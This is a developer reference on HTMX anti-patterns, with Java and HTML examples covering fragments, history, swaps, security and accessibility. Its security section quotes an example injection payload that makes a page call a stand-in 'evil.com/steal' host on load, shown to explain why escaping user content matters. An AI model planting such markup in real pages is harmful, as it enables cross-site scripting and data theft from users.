# HTMX Anti-Patterns Reference

A catalogue of ways to misuse HTMX, drawn from production failures, community discussions, and the HTMX team's own documentation. Organised from most common to most subtle.

---

## 1. Thinking in JSON Instead of Hypermedia

The single most pervasive anti-pattern. Developers coming from React/Vue/Angular instinctively reach for JSON APIs and client-side rendering. HTMX exists to eliminate that entire layer.

### 1.1 Returning JSON and Building DOM Client-Side

**Anti-pattern:** Returning JSON from endpoints consumed by HTMX, then using JavaScript to parse and render it.

```java
// WRONG: returns JSON, requires client-side rendering
@GET
@Path("/todos")
@Produces(MediaType.APPLICATION_JSON)
public List<TodoDto> list() {
    return todoService.listAll();
}

// RIGHT: returns rendered HTML fragment
@GET
@Path("/todos")
@Produces(MediaType.TEXT_HTML)
public TemplateInstance list(@HeaderParam("HX-Request") String hxRequest) {
    List<TodoDto> items = todoService.listAll();
    if ("true".equals(hxRequest)) {
        return todos$list.data("items", items);
    }
    return todos.data("items", items);
}
```

If you need a JSON API for mobile clients or third parties, build it as a separate set of endpoints. Do not try to make one endpoint serve both HTMX and JSON consumers.

### 1.2 SPA State Management on the Client

**Anti-pattern:** Recreating React/Vue-like client-side state management with localStorage, sessionStorage, or JavaScript variables to track application state.

**Why it hurts:** HTMX keeps state on the server. The server renders the correct HTML based on server-side state. When you put business state in localStorage, you create two sources of truth that inevitably diverge. You are building a worse SPA with extra steps.

**What to do instead:** Use sessions, databases, or URL parameters. The server is your state manager. If you need ephemeral UI state (e.g., which accordion is open), use CSS classes or the `hx-vals` attribute — not a JavaScript state store.

---

## 2. Full Page Responses to HTMX Requests

### 2.1 Returning the Entire Layout

**Anti-pattern:** Returning `<html><head>...</head><body>...</body></html>` when HTMX only needs a fragment.

```java
// WRONG: always returns full page, HTMX replaces target with entire HTML document
@GET
@Produces(MediaType.TEXT_HTML)
public TemplateInstance list() {
    return todos.data("items", todoService.listAll());
}

// RIGHT: context-aware response
@GET
@Produces(MediaType.TEXT_HTML)
public TemplateInstance list(@HeaderParam("HX-Request") String hxRequest) {
    List<TodoDto> items = todoService.listAll();
    return "true".equals(hxRequest)
        ? todos$list.data("items", items)    // fragment only
        : todos.data("items", items);        // full page with layout
}
```

Every endpoint that serves both direct navigation and HTMX requests must check the `HX-Request` header and respond accordingly. This is not optional — it is the core contract of the HTMX architecture.

### 2.2 Not Using hx-select When You Should

**Anti-pattern:** Returning a full page and relying on HTMX to swap the whole thing, when you only need a piece of it.

```html
{! WASTEFUL: fetches full page, swaps everything !}
<a hx-get="/ui/dashboard" hx-target="#content">Dashboard</a>

{! BETTER: fetches full page but extracts only what's needed !}
<a hx-get="/ui/dashboard" hx-target="#content" hx-select="#content">Dashboard</a>

{! BEST: server returns only the fragment (check HX-Request header) !}
<a hx-get="/ui/dashboard" hx-target="#content">Dashboard</a>
```

`hx-select` is a fallback for when you cannot control the server response. Prefer returning fragments directly.

---

## 3. Over-HTMXing: Using HTMX Where Plain HTML Works

This is the "less HTMX is more" principle. Not every interaction needs HTMX.

### 3.1 HTMX on Simple Navigation Links

**Anti-pattern:** Adding `hx-get` and `hx-target` to links that simply navigate to a new page.

```html
{! WRONG: HTMX for basic navigation !}
<a hx-get="/ui/about" hx-target="#content" hx-push-url="true">About</a>

{! RIGHT: plain HTML link, let the browser do its job !}
<a href="/ui/about">About</a>
```

A plain `<a href>` gives you: free browser caching with ETags, correct back/forward button behaviour, full page lifecycle reset, no stale JavaScript state, and accessibility for free. Do not replace this with HTMX unless you have a specific reason (e.g., preserving a media player's state across navigations).

### 3.2 hx-boost as a Blanket SPA Conversion

**Anti-pattern:** Applying `hx-boost="true"` to `<body>` to turn every link and form into an AJAX request.

**Why it hurts:**
- Browser history becomes unreliable. Back button shows partial page updates. Refresh goes blank.
- The JavaScript environment is never reset. Long-lived state accumulates, eventually entering a bad state.
- Other JavaScript libraries lose their page lifecycle hooks.
- Only the `<body>` is updated — styles and scripts in the new page's `<head>` are discarded.
- Global `let` declarations fail on the second navigation because the symbol is already defined.

**What to do instead:** Use `hx-boost` surgically on specific forms or link groups where AJAX behaviour genuinely improves UX. Do not use it as a site-wide SPA wrapper. Some htmx core team members recommend avoiding `hx-boost` entirely.

### 3.3 HTMX on Plain Forms That Would Work Without It

**Anti-pattern:** Adding `hx-post` to a form that navigates to a new page on success anyway.

```html
{! WRONG: HTMX for a form that just redirects !}
<form hx-post="/ui/register" hx-target="#content">
  ...
</form>

{! RIGHT: let the browser submit the form !}
<form method="post" action="/ui/register">
  ...
</form>
```

Reserve HTMX for forms where you want inline validation feedback, partial page updates, or to avoid a full page reload. If the form submission results in a full redirect, plain HTML is simpler and more reliable.

### 3.4 Using HTMX When the Content Should Be Server-Rendered Immediately

**Anti-pattern:** Lazy-loading content with HTMX that should be part of the initial page render.

```html
{! WRONG: critical content loaded as a separate HTMX request !}
<div hx-get="/ui/product-price" hx-trigger="load">Loading price...</div>

{! RIGHT: render it inline, it's critical content !}
<div class="price">{product.price}</div>
```

If content is essential for the page to make sense, render it server-side in the initial response. Use HTMX lazy-loading only for: slow queries, personalised content, below-the-fold content, or data the user might not need.

---

## 4. History and Navigation Mistakes

### 4.1 Missing hx-push-url on Navigation Actions

**Anti-pattern:** Omitting `hx-push-url` on actions that change the user's perceived location — pagination, tab switching, filters, search results.

```html
{! BAD: no history — user can't bookmark or use back button !}
<a hx-get="/ui/page/2" hx-target="#content">Page 2</a>

{! GOOD: preserves browser history !}
<a hx-get="/ui/page/2" hx-target="#content" hx-push-url="true">Page 2</a>
```

If the user would expect the back button to reverse the action, you need `hx-push-url`.

### 4.2 Using hx-push-url on Inline Updates

**Anti-pattern:** Adding `hx-push-url` to every HTMX request, including inline edits, modal opens, or accordion toggles.

**Why it hurts:** Pollutes the browser history with entries that make no sense when navigated. The user hits back expecting to leave the page, and instead an accordion closes.

**Rule of thumb:** `hx-push-url` is for navigation-like state changes (page, tab, filter). Not for UI micro-interactions.

---

## 5. Request and Response Mismanagement

### 5.1 Ignoring hx-sync on Forms

**Anti-pattern:** Not using `hx-sync` on forms, allowing duplicate submissions from rapid clicks.

```html
{! BAD: rapid clicks send multiple requests !}
<button hx-post="/ui/save">Save</button>

{! GOOD: prevent duplicate submissions !}
<button hx-post="/ui/save" hx-sync="this:drop">Save</button>
```

For forms that modify data, always add `hx-sync`. Choose the strategy based on context:
- `drop` — ignore new requests while one is in flight (most forms)
- `abort` — cancel the in-flight request and send a new one (search/typeahead)
- `replace` — cancel in-flight and replace with the new request

### 5.2 Polling Abuse

**Anti-pattern:** Using `hx-trigger="every 1s"` when data changes infrequently.

**Why it hurts:** Hammers the server with requests. Wastes bandwidth. Creates unnecessary load. And the UI still feels "laggy" because you are polling, not pushing.

**What to do instead:**
- Use SSE (`sse-connect`) or WebSockets for genuinely real-time data.
- Use longer polling intervals with conditions: `hx-trigger="every 30s"`.
- Use `hx-trigger="load delay:5s"` for one-shot delayed loads.

### 5.3 Not Handling Error Responses

**Anti-pattern:** Assuming HTMX will show error pages like a browser does. It does not.

**Why it hurts:** HTMX does not swap content on 4xx/5xx responses by default. The user clicks a button, the server returns a 500, and nothing visible happens. The error is silently logged to the console. From the user's perspective, the button is broken.

**What to do instead:**

```html
{! Option A: use response-targets extension !}
<body hx-ext="response-targets">
  <div id="error-display" role="alert" aria-live="polite"></div>

  <button hx-post="/ui/save"
          hx-target-error="#error-display">
    Save
  </button>
</body>
```

```javascript
// Option B: global error handler
document.body.addEventListener('htmx:responseError', function(event) {
    document.getElementById('error-display').innerHTML =
        '<div class="alert alert-danger">Something went wrong. Please try again.</div>';
});
```

Or configure `htmx.config.responseHandling` to swap on specific error codes:
```javascript
htmx.config.responseHandling = [
    {code: "204", swap: false},
    {code: "[23]..", swap: true},
    {code: "422", swap: true},       // validation errors — swap the form
    {code: "[45]..", swap: false, error: true}
];
```

### 5.4 Validation via Redirect Instead of Re-rendering

**Anti-pattern:** Redirecting on validation failure instead of returning the form with errors.

```java
// WRONG: redirect loses form state
@POST
@Transactional
public Response create(@FormParam("title") String title) {
    if (title == null || title.isBlank()) {
        return Response.seeOther(URI.create("/ui/todos?error=title-required")).build();
    }
    // ...
}

// RIGHT: return form with errors and 422 status
@POST
@Transactional
public Response create(@FormParam("title") String title) {
    if (title == null || title.isBlank()) {
        return Response.status(422)
            .entity(todos$form.data("errors", List.of("Title is required"))
                               .data("values", Map.of("title", title != null ? title : ""))
                               .render())
            .type(MediaType.TEXT_HTML)
            .build();
    }
    // ...
}
```

Use HTTP 422 so HTMX knows it is a validation error. Configure `responseHandling` to swap on 422.

### 5.5 GET Requests Not Including Form Values

**Anti-pattern:** Expecting a GET request from an element inside a form to include the form's values.

**Why it happens:** HTMX only includes enclosing form values for non-GET requests. GET requests from elements inside a form do not automatically include the form data. This is by design (GET requests should be idempotent), but it catches everyone off guard.

**What to do instead:**
```html
{! WRONG: button inside form, GET won't include form values !}
<form>
  <input name="search" type="text" />
  <button hx-get="/ui/search" hx-target="#results">Search</button>
</form>

{! RIGHT: explicitly include the form !}
<form>
  <input name="search" type="text" />
  <button hx-get="/ui/search" hx-target="#results" hx-include="closest form">Search</button>
</form>

{! ALSO RIGHT: use hx-post for search that includes form data !}
<form>
  <input name="search" type="text" />
  <button hx-post="/ui/search" hx-target="#results">Search</button>
</form>
```

---

## 6. Swap and Target Pitfalls

### 6.1 Not Understanding Swap Defaults

**Anti-pattern:** Relying on the default `innerHTML` swap when `outerHTML` is what you need, or vice versa.

**Why it matters:** The default swap strategy is `innerHTML` — the response replaces the contents of the target, not the target itself. If your response includes the target element's wrapper, you get nested duplicates. If it does not include the wrapper, `outerHTML` will lose it.

```html
{! Server returns: <tr id="row-1"><td>Updated</td></tr> !}

{! WRONG with innerHTML: nests <tr> inside <tr> !}
<tr id="row-1" hx-get="/ui/row/1" hx-swap="innerHTML">...</tr>

{! RIGHT: replace the entire row !}
<tr id="row-1" hx-get="/ui/row/1" hx-swap="outerHTML">...</tr>
```

Think about whether your response includes the target element or just its contents. Match your swap strategy accordingly.

### 6.2 Overly Broad Swap Targets

**Anti-pattern:** Targeting `#content` or `body` for every request, swapping large sections of the page when a surgical update would suffice.

**Why it hurts:** You re-render and re-transmit far more HTML than necessary. Event listeners on replaced elements are lost. Focus state is destroyed. Screen readers lose their place.

**What to do instead:** Target the smallest element that needs to change. If multiple areas need updating, use `hx-swap-oob` for the secondary targets.

### 6.3 OOB Swap Nested Element Gotcha

**Anti-pattern:** Including an element with `hx-swap-oob` inside the main response content, not realising it will be extracted and processed as an out-of-band swap.

**Why it happens:** By default, any element with `hx-swap-oob` anywhere in the response — even nested inside the main response — is processed for OOB swap. If a template fragment is reused both as an OOB target and as part of a larger fragment, the inner fragment gets extracted and removed from the main content.

**What to do instead:**
- Structure templates so OOB elements are siblings of (not nested within) the main response content.
- Or set `htmx.config.allowNestedOobSwaps = false` to disable this behaviour.

### 6.4 hx-target Inheritance Surprise

**Anti-pattern:** Placing `hx-target` on a parent element for DRY reasons, then being confused when a child element inherits it unexpectedly.

```html
{! Parent sets target for all children !}
<div hx-target="#sidebar">
  <button hx-get="/ui/sidebar-widget">Update Sidebar</button>

  {! This also targets #sidebar — probably not intended !}
  <button hx-get="/ui/main-content">Update Main</button>
</div>
```

**What to do instead:**
- Override `hx-target` explicitly on children that need different targets.
- Or disable inheritance globally: `htmx.config.disableInheritance = true`.
- Accept that locality of behaviour (seeing what an element does by looking at it) is more important than DRY for HTMX attributes.

---

## 7. Not Using OOB (Out-of-Band) Swaps

**Anti-pattern:** Making separate AJAX calls, using JavaScript, or triggering additional HTMX requests to update multiple UI areas when a single response with `hx-swap-oob` would suffice.

```html
{! WRONG: two separate requests to update cart and notification !}
<button hx-post="/ui/cart/add"
        hx-target="#cart-items">
  Add to Cart
</button>
<script>
  // then separately update the cart count...
  document.body.addEventListener('htmx:afterSwap', function() {
    htmx.ajax('GET', '/ui/cart-count', '#cart-badge');
  });
</script>

{! RIGHT: single response with OOB swap !}
<button hx-post="/ui/cart/add"
        hx-target="#cart-items">
  Add to Cart
</button>

{! Server response includes both: !}
{! Main content for #cart-items: !}
{! <div>...updated cart items...</div> !}
{! Plus OOB update: !}
{! <span id="cart-badge" hx-swap-oob="true">3</span> !}
```

One request, one response, multiple DOM updates. This is what OOB swaps are for.

---

## 8. Security Anti-Patterns

### 8.1 Missing hx-disable on User Content

**Anti-pattern:** Rendering user-generated HTML without `hx-disable`, allowing attribute injection attacks.

```html
{! BAD: user could inject hx-post, hx-delete, etc. !}
<div>{userContent.raw}</div>

{! GOOD: Qute auto-escaping prevents attribute injection !}
<div>{userContent}</div>

{! ALSO GOOD: hx-disable as defense in depth !}
<div hx-disable>{userContent.raw}</div>
```

### 8.2 Using .raw on Untrusted Data

**Anti-pattern:** Bypassing Qute's auto-escaping with `.raw` on user input.

**Why it hurts:** Creates XSS vulnerabilities. An attacker injects `<div hx-get="https://evil.com/steal" hx-trigger="load">` and HTMX happily executes it. HTMX makes HTML more powerful — which means injected HTML is more dangerous.

**What to do instead:** Only use `.raw` for content you fully control (e.g., rendered markdown from a trusted source). For user content, rely on Qute's default escaping. If you must render user HTML, sanitise it server-side and strip all `hx-*` and `data-hx-*` attributes.

### 8.3 Calling Untrusted External HTML APIs

**Anti-pattern:** Using HTMX to fetch and swap HTML from third-party domains.

**Why it hurts:** The HTMX team's own security guide says it plainly: "Calling untrusted HTML APIs is lunacy. Never do this." You are letting an external domain inject arbitrary HTML — including HTMX attributes — into your page.

**What to do instead:**
- Keep `htmx.config.selfRequestsOnly = true` (the default).
- If you need data from external APIs, use `fetch()` and `JSON.parse()` in JavaScript, then render it yourself.
- Proxy external API calls through your own server, where you control the HTML output.

### 8.4 Not Configuring HTMX Security Hardening

**Anti-pattern:** Running HTMX with default settings in a security-sensitive application without reviewing the security configuration.

**What to harden:**
```javascript
htmx.config.selfRequestsOnly = true;      // default: true, keep it
htmx.config.allowScriptTags = false;       // disable script execution in responses
htmx.config.allowEval = false;             // disable eval-based features (hx-on, etc.)
htmx.config.historyCacheSize = 0;          // disable history cache if storing sensitive data
htmx.config.allowNestedOobSwaps = false;   // prevent accidental OOB processing
```

### 8.5 Separate Frontend and Backend Domains

**Anti-pattern:** Serving your HTMX frontend from `app.example.com` and your backend from `api.example.com`.

**Why it hurts:** You now need CORS configuration. `SameSite=Lax` cookies (which prevent CSRF for free) stop working. Authentication becomes more complex. You are fighting the architecture.

**What to do instead:** Serve HTML and API from the same origin. HTMX applications are server-rendered — the server that renders the HTML should be the same server (or at least the same domain) that handles the HTMX requests.

---

## 9. Accessibility Anti-Patterns

### 9.1 HTMX on Non-Interactive Elements

**Anti-pattern:** Adding `hx-get`/`hx-post` to `<div>` or `<span>` elements without proper ARIA roles, tabindex, and keyboard event handling.

**Why it hurts:** Sighted mouse users see a clickable area. Keyboard users cannot reach it. Screen readers do not announce it as interactive.

**What to do instead:** Use `<button>` or `<a>` elements. If you must use a `<div>`, add `role="button"`, `tabindex="0"`, and handle `keydown` for Enter and Space.

### 9.2 Missing ARIA Attributes on Dynamic Content

```html
{! BAD: no accessibility hints !}
<button hx-get="/ui/load-more" hx-target="#items" hx-swap="beforeend">
  Load More
</button>

{! GOOD: screen readers understand the interaction !}
<button hx-get="/ui/load-more"
        hx-target="#items"
        hx-swap="beforeend"
        aria-label="Load more items"
        aria-controls="items">
  Load More
</button>
```

### 9.3 No Loading State Announcement

```html
{! BAD: no feedback during async operation !}
<button hx-post="/ui/save">Save</button>

{! GOOD: loading indicator with screen reader support !}
<button hx-post="/ui/save"
        hx-indicator="#spinner">
  Save
  <span id="spinner" class="htmx-indicator" aria-hidden="true">
    <span class="sr-only">Saving...</span>
  </span>
</button>
```

### 9.4 No Live Region for Dynamic Errors

**Anti-pattern:** Swapping error messages into the DOM without a live region. Screen readers never announce the error.

```html
<div id="error-announce"
     role="alert"
     aria-live="polite"
     aria-atomic="true"
     class="sr-only"></div>

<script>
document.body.addEventListener('htmx:responseError', function(event) {
    document.getElementById('error-announce').textContent =
        'An error occurred. Please try again.';
});
</script>
```

### 9.5 Focus Management After Swaps

**Anti-pattern:** Swapping content without managing focus. After an HTMX swap, focus can land on `<body>` or nowhere, leaving keyboard users stranded.

**What to do instead:**
```html
{! Set focus after swap using hx-on !}
<form hx-post="/ui/save"
      hx-target="#result"
      hx-on::after-swap="document.getElementById('result').focus()">
  ...
</form>

<div id="result" tabindex="-1" role="status" aria-live="polite"></div>
```

---

## 10. Overusing JavaScript

**Anti-pattern:** Writing JavaScript event handlers when HTMX attributes would work.

Before writing `addEventListener`, check if the following can solve it:
- `hx-trigger` — custom trigger conditions, including keyboard events, intersections, and delays
- `hx-confirm` — native browser confirmation dialogs
- `hx-indicator` — loading state management
- `hx-on:*` — inline event handlers (use sparingly, and only if `allowEval` is enabled)
- `hx-vals` — include extra values in requests
- `hx-headers` — add custom headers
- `hx-ext` — use or write an extension

If HTMX cannot do it, JavaScript is fine. HTMX is not anti-JavaScript — it is anti-unnecessary-JavaScript.

---

## 11. Testing Neglect

### 11.1 Not Testing Server Responses for Correct Fragments

**Anti-pattern:** Assuming server-rendered HTML is always correct. Not testing that endpoints return the right fragment for HTMX requests vs. full pages for direct navigation.

**What to do instead:** Write integration tests that send requests with and without the `HX-Request` header and assert on the response structure:
```java
@Test
void htmxRequestReturnsFragment() {
    given()
        .header("HX-Request", "true")
        .when().get("/ui/todos")
        .then()
        .statusCode(200)
        .body(not(containsString("<html")))   // no full page
        .body(containsString("todo-list"));   // has the fragment
}

@Test
void directRequestReturnsFullPage() {
    given()
        .when().get("/ui/todos")
        .then()
        .statusCode(200)
        .body(containsString("<html"))       // full page
        .body(containsString("todo-list"));  // includes the content
}
```

### 11.2 Not Testing ID Contracts

**Anti-pattern:** Renaming an `id` in a template without updating the corresponding `hx-target` in another template. The swap silently fails.

**What to do instead:** Treat element IDs referenced by `hx-target`, `hx-swap-oob`, and `hx-select` as API contracts. Test them. Consider using constants or template includes to keep them in sync.

---

## Summary: The HTMX Mindset

| SPA Thinking | HTMX Thinking |
|---|---|
| JSON API + client-side rendering | Server-rendered HTML fragments |
| Client-side state (Redux, Pinia) | Server-side state (session, DB, URL) |
| SPA router, History API | Plain links + `hx-push-url` where needed |
| JavaScript for everything | HTML for structure, HTMX for dynamics, JS as last resort |
| Mock the API, test the component | Test the server response, test the contract |
| One endpoint serves all clients | Separate endpoints for HTMX and JSON consumers |
| Full page SPA shell + hydration | Full page from server + HTMX for partial updates |
| Every interaction is AJAX | Most interactions are plain HTML; HTMX only where it earns its keep |

The fundamental principle: **HTMX is a scalpel, not a chainsaw. Use it to enhance specific interactions that benefit from partial page updates. Let the browser handle everything else.**
